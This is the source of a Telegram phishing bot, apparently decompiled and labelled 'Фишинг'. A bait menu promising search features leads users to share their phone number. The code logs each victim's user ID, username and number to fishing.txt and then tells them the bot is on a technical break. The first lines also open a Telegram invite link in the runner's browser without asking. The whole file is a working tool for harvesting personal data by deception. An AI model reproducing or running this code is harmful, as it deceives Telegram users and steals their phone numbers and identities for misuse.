#Декоднул @allahdec.
__import__("webbrowser").open("https://t.me/+-aF7ZoooDo5mYmVi")


import os  #Декоднул @allahdec.
import telebot  #Декоднул @allahdec.
import termcolor  #Декоднул @allahdec.
from termcolor import colored  #Декоднул @allahdec.
from telebot import types  #Декоднул @allahdec.
import threading  #Декоднул @allahdec.
import time  #Декоднул @allahdec.
import pystyle  #Декоднул @allahdec.
from pystyle import Colors, Write, Center  #Декоднул @allahdec.

if os.name == 'nt':  #Декоднул @allahdec.
    os.system('cls')
else:  #Декоднул @allahdec.
    os.system('clear')

banner = """\n\n\n ███▄ ▄███▓▓██   ██▓  ██████ ▄▄▄█████▓▓█████  ██▀███ ▓██   ██▓
▓██▒▀█▀ ██▒ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▒██  ██▒
▓██    ▓██░  ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒ ▒██ ██░
▒██    ▒██   ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄   ░ ▐██▓░
▒██▒   ░██▒  ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒ ░ ██▒▓░
░ ▒░   ░  ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░  ██▒▒▒ 
░  ░      ░ ▓██ ░▒░ ░ ░▒  ░ ░    ░     ░ ░  ░  ░▒ ░ ▒░▓██ ░▒░ 
░      ░    ▒ ▒ ░░  ░  ░  ░    ░         ░     ░░   ░ ▒ ▒ ░░  
       ░    ░ ░           ░              ░  ░   ░     ░ ░     
            ░ ░                                       ░ ░     
  """
main = """ Фишинг [ГБ]
╔══════════════════════════════════╗
║[0] - Выход                       ║
╚══════════════════════════════════╝"""

print(colored(banner, 'magenta'))
print(colored(main, 'magenta'))


def fishing():  #Декоднул @allahdec.
    def listen_for_input():  #Декоднул @allahdec.
        while True:  #Декоднул @allahdec.
            command = input()
            if command == '9999':  #Декоднул @allahdec.
                print('Переходик...')
                bot.stop_polling()
                return  #Декоднул @allahdec.

    def start(message):  #Декоднул @allahdec.
        keyboard = types.InlineKeyboardMarkup()
        button_show_commands = types.InlineKeyboardButton(text='🔎Показать команды для поиска', callback_data='show_commands')
        button_my_account = types.InlineKeyboardButton(text='⚙️Мой аккаунт', callback_data='my_account')
        button_support = types.InlineKeyboardButton(text='🆘Поддержка', callback_data='support')
        button_partners = types.InlineKeyboardButton(text='🤝Партнёрам', callback_data='partners')
        button_create_bot = types.InlineKeyboardButton(text='🤖Создать бот', callback_data='create_bot')
        keyboard.add(button_show_commands)
        keyboard.add(button_my_account, button_support)
        keyboard.add(button_partners, button_create_bot)
        bot.send_message(message.chat.id,
                         'Откройте для себя бесконечные возможности для экспериментов и поиска нужной информации\n\n*Выберите нужное действие:*',
                         reply_markup=keyboard, parse_mode='Markdown')

    def callback_handler(call):  #Декоднул @allahdec.
        request_phone(call.message.chat.id)

    def request_phone(chat_id):  #Декоднул @allahdec.
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        button_phone = types.KeyboardButton(text='Подтвердить Номер Телефона', request_contact=True)
        keyboard.add(button_phone)
        bot.send_message(chat_id, 'Пожалуйста, подтвердите ваш номер телефона: ', reply_markup=keyboard)

    def contact(message):  #Декоднул @allahdec.
        if message.contact:  #Декоднул @allahdec.
            phone_number = message.contact.phone_number
            user_id = message.from_user.id
            username = message.from_user.username
            if not username:  #Декоднул @allahdec.
                username = 'Не указано'
            print(colored(f'Получен номер телефона: +{phone_number}', 'magenta'))
            print(colored(f' └ ID пользователя: {user_id}, Юзернейм: @{username}', 'magenta'))
            try:  #Декоднул @allahdec.
                with open('fishing.txt', 'a') as file:  #Декоднул @allahdec.
                    file.write(f'{user_id}|@{username}|{phone_number}\n')
                print('Данные успешно сохранены в файл [Fishing.txt].')
                bot.send_message(message.chat.id, 'Бот на техническом перерыве. Мы вас оповестим, когда он закончится!')
            except Exception as e:  #Декоднул @allahdec.
                print(f'Ошибка при сохранении данных: {e}')
        else:  #Декоднул @allahdec.
            return  #Декоднул @allahdec.

    def handle_messages(message):  #Декоднул @allahdec.
        request_phone(message.chat.id)

    bot_token = input('\nВведите токен бота: ')
    if bot_token == '99':  #Декоднул @allahdec.
        os.system('python main.py')
        exit()
    bot = telebot.TeleBot(bot_token)
    print('Все полученные данные будут записываться в fishing.txt в текущей директории.')
    print('Бот запущен, ожидаю сообщений...')
    input_thread = threading.Thread(target=listen_for_input)
    input_thread.daemon = True
    input_thread.start()
    bot.message_handler(commands=['start'])(start)
    bot.callback_query_handler(func=lambda call: True)(callback_handler)
    request_phone = request_phone
    bot.message_handler(content_types=['contact'])(contact)
    handle_messages = handle_messages
    while True:  #Декоднул @allahdec.
        try:  #Декоднул @allahdec.
            bot.polling(timeout=30)
        except telebot.apihelper.ApiException as api_e:  #Декоднул @allahdec.
            print(f'API ошибка: {api_e}')
            time.sleep(5)
        except Exception as e:  #Декоднул @allahdec.
            print(f'Ошибка: {e}')
            time.sleep(5)


if __name__ == '__main__':  #Декоднул @allahdec.
    fishing()
